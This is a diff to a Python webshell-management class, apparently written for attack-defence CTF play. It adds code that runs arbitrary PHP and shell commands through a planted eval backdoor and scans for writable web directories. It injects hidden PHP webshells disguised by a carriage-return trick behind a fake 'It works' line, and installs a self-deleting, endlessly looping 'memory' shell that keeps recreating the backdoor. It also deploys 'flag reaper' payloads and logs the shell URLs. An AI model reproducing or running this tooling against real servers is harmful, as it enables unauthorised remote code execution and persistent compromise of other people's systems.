@@ -11,6 +11,7 @@ from core.log import Log
 import requests
 import string
 import os
+import json
 
 class WebShell():
     url = "http://127.0.0.1/c.php"
@@ -26,22 +27,57 @@ class WebShell():
         self.method = method
         self.password = password
         self.init(self.url, self.method, self.password)
+        self.info = {
+            "url":self.url,
+            "method":self.method,
+            "password":self.password
+        }
         if self.working:
             self.webroot = self.get_webroot()[1]
             self.php_version = self.get_php_version()
             self.kernel_version = self.get_kernel_version()
             self.print_info()
 
+    def php_code_exec(self, code):
+        # TODO : 自己实现这个函数
+        key = random_string(8, string.ascii_letters)
+        god_code = "eval($_POST[%s]);" % (key)
+        code = "@ob_start('ob_gzip');" + code + "@ob_end_flush();"
+        try:
+            if self.method == "POST":
+                data = {self.password:god_code, key:code}
+                response = requests.post(self.url, data=data, timeout=5)
+            elif self.method == "GET":
+                params = {self.password:code}
+                response = requests.get(self.url, params=params, timeout=5)
+            else:
+                return (False, "Unsupported method!")
+            content = response.text
+            return (True, content)
+        except:
+            Log.error("The connection is aborted!")
+            return (False, "The connection is aborted!")
+
+    '''
+    def get_self_content(self):
+        result = self.php_code_exec_token("var_dump(readfile(__FILE__);")
+        print result
+        if result[0]:
+            content = result[1]
+            return content
+        return False
+        '''
+
     def get_webroot(self):
         return self.php_code_exec_token("echo $_SERVER['DOCUMENT_ROOT']")
 
     def get_php_version(self):
         if self.php_version != "":
-            Log.success("PHP Version : \n\t%s" % (self.php_version))
+            # Log.success("PHP Version : \n\t%s" % (self.php_version))
             return self.php_version
         result = self.auto_exec("php -v")
         if result[0]:
-            Log.success("PHP Version : \n\t%s" % (result[1][0:-1]))
+            # Log.success("PHP Version : \n\t%s" % (result[1][0:-1]))
             return result[1][0:-1]
         else:
             Log.error("Error occured while getting php version! %s" % result[1])
@@ -49,11 +85,11 @@ class WebShell():
 
     def get_kernel_version(self):
         if self.kernel_version != "":
-            Log.success("Kernel Version : \n\t%s" % (self.kernel_version))
+            # Log.success("Kernel Version : \n\t%s" % (self.kernel_version))
             return self.kernel_version
         result = self.auto_exec("uname -a")
         if result[0]:
-            Log.success("Kernel Version : \n\t%s" % (result[1][0:-1]))
+            # Log.success("Kernel Version : \n\t%s" % (result[1][0:-1]))
             return result[1][0:-1]
         else:
             Log.error("Error occured while getting kernel version! %s" % result[1])
@@ -68,6 +104,8 @@ class WebShell():
         Log.success("=" * 32)
         Log.success("PHP version : \n\t%s" % (self.php_version))
         Log.success("Kernel version : \n\t%s" % (self.kernel_version))
+        Log.success("=" * 32)
+        Log.success("WebRoot : %s" % (self.webroot))
         Log.success("=" * 32)
 
     def read_file(self, filepath):
@@ -84,11 +122,59 @@ class WebShell():
         if output[0]:
             if output[1] == "":
                 Log.warning("Nothing found!")
+                return []
             else:
-                Log.success("Found : \n%s" % output[1])
+                Log.success("Found : \n%s" % output[1][0:-1])
+                writable_dirs = []
+                for d in output[1].split("\n")[0:-1]:
+                    if not d.startswith("find: '"):
+                        writable_dirs.append(d)
+                return writable_dirs
         else:
             Log.error("Error occured! %s" % output[1])
+            return []
 
+    def auto_inject_memery_webshell(self, filename, password):
+        content = '<?php eval($_REQUEST["%s"]);?>' % (password)
+        Log.info("Building webshell : %s" % (repr(content)))
+        self.auto_inject_memery_phpfile(filename, content)
+
+    def auto_inject_memery_phpfile(self, filename, content):
+        Log.info("Auto inject memery webshell...")
+        webshell_content = "<?php set_time_limit(0); ignore_user_abort(true); $filename = '%s'; $shell = '%s'; $fake = '<?php print_r(\"It works!\")?>'; $content = $shell.'\r'.$fake.str_repeat(' ', strlen($shell) - strlen($fake)).'\n'; unlink(__FILE__); while(true){ if (!file_exists($filename)){ file_put_contents($filename, $content); } usleep(0x10); } ?>" % (filename, content)
+        Log.info("Code : [%s]" % (repr(webshell_content)))
+        base64_encoded_webshell = webshell_content.encode("base64").replace("\n", "")
+        writable_dirs = self.get_writable_directory()
+        for writable_dir in writable_dirs:
+            Log.info("-" * 32)
+            memery_webshell_filename = ".index.php"
+            base_url = "%s%s/" % ("".join(["%s/" % (i) for i in self.url.split("/")[0:3]]), writable_dir.replace("%s/" % (self.webroot), ""))
+            url = base_url + memery_webshell_filename
+            path = "%s/%s" % (writable_dir, memery_webshell_filename)
+            code = "if(file_put_contents('%s', base64_decode('%s'))){echo 'Success!';}else{echo 'Failed!';}" % (path, base64_encoded_webshell)
+            code_exec_result = self.php_code_exec_token(code)[1]
+            if ("Success!" in code_exec_result):
+                Log.success("Injection finished!")
+                Log.info("Trying to visit : [%s] to active the webshell..." % (url))
+                Log.info("Setting timeout to 1 second ...")
+                try:
+                    response = requests.get(url, timeout=1)
+                    Log.error("Error! Maybe the directory cannnot execute php script!")
+                    Log.error("\n%s\n" % (response.content))
+                except Exception as e:
+                    error_content = str(e)
+                    if "Read timed out" in error_content:
+                        Log.success("Webshell actived! (%s)" % (error_content))
+                        webshell_url = "%s%s" % (base_url, filename)
+                        Log.info("Url : %s" % (webshell_url))
+                        Log.info("Content : %s" % (repr(content)))
+                        with open("Webshell.txt", "a+") as f:
+                            log_content = "%s => %s\n" % (webshell_url, repr(content))
+                            f.write(log_content)
+                    else:
+                        Log.error("Error! Maybe the directory is not writable!")
+            else:
+                Log.error("Error! Maybe the directory is not writable!")
 
     def get_suid_binaries(self):
         paths = ['/usr/local/sbin', '/usr/local/bin', '/usr/sbin', '/usr/bin', '/sbin', '/bin', '/usr/games', '/usr/local/games', '/snap/bin']
@@ -156,19 +242,27 @@ class WebShell():
 
     def check_working(self, url, method, auth):
         Log.info("Checking whether the webshell is still work...")
-        key = random_string(6, string.letters)
-        value = random_string(32, string.letters)
+        flag = random_string(32, string.letters)
         token = random_string(32, string.letters)
-        Log.info("Using challenge key : [%s] , value : [%s]" % (key, value))
+        Log.info("Using challenge flag : [%s]" % (flag))
         Log.info("Using token : [%s]" % (token))
+        code = "echo '%s'; echo '%s'; echo '%s';" % (token, flag, token)
+        result = self.php_code_exec(code)
+        if result[0]:
+            content = result[1]
+            for i in content.split(token):
+                if i == flag:
+                    return True
+        return False
+        '''
         method = string.upper(method)
         if method == "POST" or method == "REQUEST":
             Log.info("Using POST method...")
-            data = {auth:'echo "'+token+'";var_dump("$_POST['+key+']");echo "'+token+'";', key:value}
+            data = {auth:'echo "'+token+'";echo "'+flag+'";echo "'+token+'";'}
             response = requests.post(url, data=data)
         elif method == "GET":
             Log.info("Using GET method...")
-            params = {auth:'echo "'+token+'";var_dump("$_POST['+key+']");echo "'+token+'";'}
+            params = {auth:'echo "'+token+'";echo "'+flag+'";echo "'+token+'";'}
             url = build_url(url, params)
             data = {key:value}
             response = requests.post(url, data=data)
@@ -176,8 +270,8 @@ class WebShell():
             Log.error("Unsupported method!")
             return False
         content = response.content
-        Log.success("The content is :\n " + content)
-        return value in content
+        # Log.success("The content is :\n " + content)
+        '''
 
     def check_connection(self, url):
         Log.info("Checking the connection to the webshell...")
@@ -214,11 +308,13 @@ class WebShell():
         pass
 
     def php_command_exec(self,function, command):
+        code = "%s(base64_decode('%s'));" % (function, ("%s 2>&1" % command).encode("base64").replace("\n", ""))
+        return self.php_code_exec_token(code);
+    '''
         try:
             tick = random_string(3, string.letters)
             token = random_string(32, string.letters)
             if self.method == "POST":
-                data = {self.password:"@ini_set('display_errors', '0');echo '"+token+"';"+function+"($_POST["+tick+"]);echo '"+token+"';", tick:command+ " 2>&1"}
                 response = requests.post(self.url, data=data)
             elif self.method == "GET":
                 params = {self.password:"@ini_set('display_errors', '0');echo '"+token+"';"+function+"($_GET["+tick+"]);echo '"+token+"';", tick:command+ " 2>&1"}
@@ -233,6 +329,7 @@ class WebShell():
         except Exception as e:
             Log.error(e)
             return (False, e)
+            '''
 
     def php_code_exec_token(self, code):
         token = random_string(32, string.letters)
@@ -242,32 +339,16 @@ class WebShell():
             content = result[1]
             return (True, content.split(token)[1])
         else:
+            content = "Time out!"
             return (False, content)
 
-    def php_code_exec(self, code):
-        # enable gzip
-        code = "ob_start('ob_gzip');" + code + "ob_end_flush();"
-        try:
-            if self.method == "POST":
-                data = {self.password:code}
-                response = requests.post(self.url, data=data)
-            elif self.method == "GET":
-                params = {self.password:code}
-                response = requests.get(self.url, params=params)
-            else:
-                return (False, "Unsupported method!")
-            content = response.text
-            return (True, content)
-        except:
-            Log.error("The connection is aborted!")
-            return (False, "The connection is aborted!")
 
     def auto_exec_print(self, command):
         result = self.auto_exec(command)
         if result[0]:
-            Log.success("Result : \n%s" % result[1][0:-1])
+            Log.success("Result : \n%s" % (repr(result[1][0:-1])).replace("\\n", "\n")[2:-1])
         else:
-            Log.error("Error occured! %s" % result[1][0:-1])
+            Log.error("Error occured! %s" % (repr(result[1][0:-1])).replace("\\n", "\n")[2:-1])
 
 
     def auto_exec(self, command):
@@ -494,3 +575,76 @@ class WebShell():
         else:
             Log.error("Some error occured while checking!")
             return False
+
+
+    def auto_inject_webshell(self, filename, password):
+        # TODO : remove arg filename
+        webshell_content = "<?php eval($_REQUEST['%s']);?>" % (password)
+        fake_content = "<?php print_r('It works');?>"
+        padding = " " * (len(webshell_content) - len(fake_content))
+        content = webshell_content + "\r" + fake_content + padding + "\n"
+        urls = self.auto_inject_phpfile(filename, content)
+        Log.success("Inject success : \n%s" % (urls))
+
+    def auto_inject_flag_reaper(self, filename, content):
+        # TODO : remove arg filename
+        urls = self.auto_inject_phpfile(filename, content)
+        success_numbers = 0
+        for url in urls:
+            Log.info("Trying to visit : [%s] to launch the flag reaper..." % (url))
+            Log.info("Setting timeout to 1 second ...")
+            try:
+                response = requests.get(url, timeout=1)
+                Log.error("Error! Maybe the directory cannnot execute php script!")
+                Log.error("\n%s\n" % (response.content))
+            except Exception as e:
+                error_content = str(e)
+                Log.info(error_content)
+                if "Read timed out" in error_content:
+                    Log.success("Actived!")
+                    success_numbers += 1
+                    # return True
+                else:
+                    Log.error("Error! Maybe the directory is not writable!")
+        if success_numbers > 0:
+            Log.success("Active finished : [%d/%d]" % (success_numbers, len(urls)))
+            return True
+        else:
+            Log.error("All failed!")
+            return False
+
+    def auto_inject_phpfile(self, filename, webshell_content):
+        Log.info("Auto injecting : [%s] => [%s]" % (filename, repr(webshell_content)))
+        Log.info("Code : [%s]" % (repr(webshell_content)))
+        Log.info("Length : [%d]" % (len(webshell_content)))
+        Log.info("Getting writable dirs...")
+        writable_dirs = self.get_writable_directory()
+        urls = []
+        if len(writable_dirs) == 0:
+            Log.error("No writable dirs...")
+            return False
+        else:
+            for writable_dir in writable_dirs:
+                writable_dir += "/"
+                filename = ".%s.php" % (random_string(16, string.letters + string.digits))
+                Log.info("Writing [%s] into : [%s]" % (repr(webshell_content), writable_dir))
+                php_code = "file_put_contents('%s',base64_decode('%s'));" % ("%s/%s" % (writable_dir, filename), webshell_content.encode("base64").replace("\n",""))
+                self.php_code_exec(php_code)
+                base_url = "%s%s" % ("".join(["%s/" % (i) for i in self.url.split("/")[0:3]]), writable_dir.replace("%s" % (self.webroot), ""))
+                webshell_url = ("%s%s" % (base_url, filename)).replace("//", "/").replace("https:/", "https://").replace("http:/", "http://")
+                with open("Webshell.txt", "a+") as f:
+                    log_content = "%s => %s\n" % (webshell_url, repr(webshell_content))
+                    f.write(log_content)
+                urls.append(webshell_url)
+        return urls
+
+    def save(self, filename):
+        webshell_config = json.load(open(filename, "a+"))
+        config = {
+            "url":self.url,
+            "method":self.method,
+            "password":self.password
+        }
+        webshell_config.append(config)
+        json.dump(webshell_config, open(filename, "w"))
+
